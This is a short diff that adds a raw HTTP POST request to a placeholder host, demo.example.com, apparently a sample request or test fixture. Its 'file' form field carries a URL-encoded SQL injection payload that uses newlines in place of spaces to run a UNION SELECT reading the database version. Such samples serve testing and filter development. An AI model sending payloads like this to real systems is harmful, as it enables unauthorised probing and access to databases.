@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Connection: close
+
+file=1%0aunion%0aall%0aselect%0anull,(select%0a@@version),null
